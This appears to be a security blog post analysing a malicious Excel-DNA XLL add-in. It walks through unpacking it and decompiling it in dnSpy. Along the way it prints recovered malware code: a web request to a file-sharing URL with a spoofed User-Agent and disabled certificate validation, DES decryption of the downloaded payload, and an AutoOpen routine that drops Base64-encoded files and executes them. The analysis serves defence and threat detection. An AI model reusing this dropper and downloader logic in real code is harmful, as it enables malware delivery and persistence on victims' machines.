+<h2 id="9cea">ExcelDNA and ExcelDNA-Unpack</h2>
+<p id="aed0"><a href="https://github.com/augustoproiete/exceldna-unpack" rel="noreferrer noopener" target="_blank">ExcelDNA-Unpack</a> is a tool designed to extract the contents of Excel add-ins (XLL files) created with the Excel DNA framework.</p>
+<pre><code>C:\Users\vboxuser\Downloads\exceldna-unpack-2.1.0-win7-x64\exceldna-unpack.exe -xllFile=C:\Users\vboxuser\Documents\7e9f91f0cfe3769df30608a88091ee19bc4cf52e8136157e4e0a5b6530d510ec.xll
+Excel-DNA Unpack Tool, version 2.1.0+60b3d6031babfd276f540b95f9fb298c18342a00
+
+Analyzing 7e9f91f0cfe3769df30608a88091ee19bc4cf52e8136157e4e0a5b6530d510ec.xll . . . OK
+
+Extracting EXCELDNA.LOADER.dll (ASSEMBLY) . . . OK
+Extracting EXCELDNA.INTEGRATION.dll (ASSEMBLY_LZMA) . . . OK
+Extracting EXCELDNAPROJECTDEMO.dll (ASSEMBLY_LZMA) . . . OK
+Extracting __MAIN__.dna (DNA) . . . OK</code></pre>
+<figure><img alt="" src="/img/2025/01/image-13.png"/><figcaption class="wp-element-caption">__MAIN__.dna can be opened in any text editor to view the packed file.</figcaption></figure>
+<ul>
+<li>The extracted components include critical elements like the loader (<code>EXCELDNA.LOADER.dll</code>), integration libraries, and a project-specific DLL, all of which can be reverse-engineered for deeper analysis.</li>
+<li>Once unpacked, the file specified in the ExternalLibrary Path in the MAIN file must be opened in dnSpy — a .NET decompiler, and debugger used to analyze compiled .NET applications.</li>
+</ul>
+<h3>Examining Excel DNA in dnSpy</h3>
+<p>The extracted <code>ExcelDnaProjectDemo.dll</code> was loaded into dnSpy, a .NET decompiler, for detailed inspection.</p>
+<figure><img alt="" src="/img/2025/01/image-14.png" style="width:1246px;height:auto"/></figure>
+<ul>
+<li>Upon loading the file, the presence of an <code>HttpWebRequest</code> immediately stands out, indicating communication with a file-sharing platform.</li>
+<li>Before initiating the request, the code enforces the use of <strong>TLS 1.2</strong> for secure content retrieval from <code>jumpshare.com</code>. This ensures compatibility with servers requiring modern security protocols and retrieves the content as a UTF-8 encoded string.</li>
+</ul>
+<pre><code>ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;</code></pre>
+<ul>
+<li>With the secure connection, <code>WebRequest.Create()</code> initializes a new web request to the URL and a GET request below it.</li>
+</ul>
+<pre><code>HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://jumpshare.com/viewer/load/kFEPlgWBGfeyXVXCxD3u");
+
+httpWebRequest.Method = "GET";</code></pre>
+<ul>
+<li>The use of a misleading <code>UserAgent</code> string, imitating an outdated Internet Explorer browser, ensures the request bypasses some web application firewalls and bot-detection systems.</li>
+</ul>
+<pre><code>httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; MSIE/11.0; rv:11.0;) like Gecko";</code></pre>
+<ul>
+<li>This line overrides SSL certification validation, bypassing errors, and accepts all certificates, allowing the program to connect to malicious servers.</li>
+</ul>
+<pre><code>httpWebRequest.ServerCertificateValidationCallback = ((object _s, X509Certificate _x509s, X509Chain _x509c, SslPolicyErrors _ssl) =&gt; true);</code></pre>
+<h3>Decryption and Execution</h3>
+<figure><img alt="" src="/img/2025/01/image-15.png"/><figcaption class="wp-element-caption">Decrypts a Base64 encoded DES encrypted string using a predefined key and IV and returns as plain text.</figcaption></figure>
+<ul>
+<li>The decryption process starts with a Base64-encoded DES-encrypted string that uses a predefined key and initialization vector (IV).</li>
+<li>The encrypted text is initially encoded in Base64, with spaces in the <code>textToDecrypt</code> replaced by <code>+</code> symbols before decoding the Base64 string into a byte array.</li>
+</ul>
+<p id="b77f">The decryption process begins by creating a <code>DESCryptoServiceProvider</code> object:</p>
+<pre><code>using (DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider())</code></pre>
+<p>A <code>MemoryStream</code> is then set up to store the decrypted output:</p>
+<pre><code>MemoryStream memoryStream = new MemoryStream();</code></pre>
+<p>Next, a <code>CryptoStream</code> is initialized to handle the decryption process using the DES key (<code>rgbKey</code>) and IV (<code>rgbIV</code>), which have been previously converted into byte arrays:</p>
+<pre><code>CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(rgbKey, rgbIV), CryptoStreamMode.Write);</code></pre>
+<p>The Base64 decoded encrypted byte array is written to <code>CryptoStream</code> :</p>
+<pre><code>cryptoStream.Write(array, 0, array.Length);</code></pre>
+<p>Finally, the decryption is completed, and the data is pushed into the <code>MemoryStream</code>:</p>
+<pre><code>cryptoStream.FlushFinalBlock();</code></pre>
+<p>The decrypted bytes in the <code>MemoryStream</code> are then converted into a UTF-8 string:</p>
+<pre><code>text = Encoding.UTF8.GetString(memoryStream.ToArray());</code></pre>
+<figure><img alt="" src="/img/2025/01/image-16.png"/></figure>
+<p>The decrypted plaintext could serve as executable code, configuration data, or other instructions. However, because the site (<code>jumpshare.com</code>) hosting the payload is now offline, the exact response remains unknown.</p>
+<h2 id="1f94">Execution of Malicious Content</h2>
+<ul>
+<li>With the payload decrypted, the next phase focuses on executing the malicious content and analyzing its behavior.</li>
+<li>Once the decryption process is complete, the code retrieves additional malicious content from a remote server and executes it.</li>
+<li>The code retrieves a response from <code>jumpshare.com</code>, containing what appears to be an encrypted payload designed for further decryption and execution. This payload is passed to a method that isolates the encrypted portion and decrypts it using a DES key and initialization vector (IV), converting the Base64 string into plaintext.</li>
+</ul>
+<p id="c93a">The decrypted payload initiates further actions, such as:</p>
+<ul>
+<li>Writing multiple Base64-encoded files to disk.</li>
+<li>Executing the dropped payloads.</li>
+</ul>
+<figure><img alt="" src="/img/2025/01/image-17.png"/></figure>
+<h2 id="df3f">AutoOpen Method Analysis</h2>
+<ul>
+<li>The <code>AutoOpen</code> method serves as the automation mechanism for loading and executing malicious content embedded within the XLL file.</li>
+</ul>
+<pre><code>public void AutoOpen()
+  {
+   try
+   {
+    if (File.Exists(test.excel_path))
+    {
+     new Thread(new ThreadStart(this.Thread1)).Start();
+    }
+    else
+    {
+     File.WriteAllBytes(test.excel_path, System.Convert.FromBase64String(test.excel_base64));
+     File.WriteAllBytes(test.exePath, System.Convert.FromBase64String(test.exe_base64));
+     File.WriteAllBytes(test.configPath, System.Convert.FromBase64String(test.config_base64));
+     File.WriteAllBytes(test.DllPath, System.Convert.FromBase64String(test.Dll_base64));
+     this.Get();
+     new Thread(new ThreadStart(this.Thread1)).Start();
+    }
+   }
+   catch (Exception)
+   {
+   }
+  }</code></pre>
+<ul>
+<li>This design ensures the payload is triggered every time the XLL is loaded, establishing persistence on the target system.</li>
+</ul>
+<p id="7ed2">The program checks for <code>test.excel_path</code> :</p>
+<ul>
+<li>If it exists, it starts a new thread to launch the file</li>
+<li>If it doesn’t exist, then writes multiple files to disk using base64 encoded data, executes the payload with <code>Get()</code> , launches the <code>Thread1</code> to execute the file.</li>
+</ul>
+<h2 id="7699">Decryption Behavior</h2>
+<ul>
+<li>Retrieves malicious JS, decrypts, and executes it — evading detection.</li>
+<li>Writes and decodes files to obfuscate content and avoid immediate suspicion.</li>
+<li>Ensures persistence by executing the malicious process every time the program is launched.</li>
+<li>Uses Base64 encoding and dynamic execution to bypass antivirus/EDR.</li>
+<li>Runs the payload on separate threads to maintain stealth and avoid blocking the main program.</li>
+</ul>
+<figure><img alt="" src="/img/2025/01/image-18.png"/></figure>
+<h2 id="b2c6">Observed Behavior</h2>
+<ul>
+<li><strong>Persistence</strong>: The <code>xlAutoOpen</code> method ensures automatic execution whenever the XLL is loaded, making the attack self-replicating and difficult to remove without deeper investigation.</li>
+<li><strong>Evasion</strong>: Base64 encoding, combined with dynamic decryption and execution, obfuscates the malicious content. SSL validation bypass and misleading User-Agent strings help circumvent antivirus/EDR solutions and web application firewalls.</li>
+<li><strong>File Writing</strong>: The code writes multiple Base64-encoded files to disk, further obfuscating malicious intent while preparing payloads for execution.</li>
+<li><strong>Payload Execution</strong>: Encrypted scripts retrieved from remote servers are decrypted and executed. These actions enable attackers to install additional malware components or initiate further malicious activities.</li>
+</ul>
+<h2 id="6296">Conclusion</h2>
+<ul>
+<li>Leveraging tools like ExcelDNA-Unpack to extract their components and dnSpy to reverse-engineer their underlying code, we uncovered how attackers embed malicious behavior, such as downloading additional payloads or executing obfuscated scripts. The consistent presence of <code>xlAutoOpen</code> as an entry point underscores its importance in XLL-based attacks. To mitigate these threats, organizations should closely monitor the use of XLL add-ins and restrict the use of external add-ins.</li>
+</ul>
+<p id="9ff1">IOCs: hxxps[://]jumpshare[.]com/viewer/load/kFEPlgWBGfeyXVXCxD3u</p>
+<p></p>
+
+
+          <p class="post-back"><a href="/">&larr; Back to Blog</a></p>
+        </article>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <div class="container">
+        <p>&copy; byevincent &mdash; <a href="https://github.com/byevincent" target="_blank" rel="noreferrer">GitHub</a></p>
+      </div>
+    </footer>
+
+    <script src="/js/main.js"></script>
+  </body>
+</html>
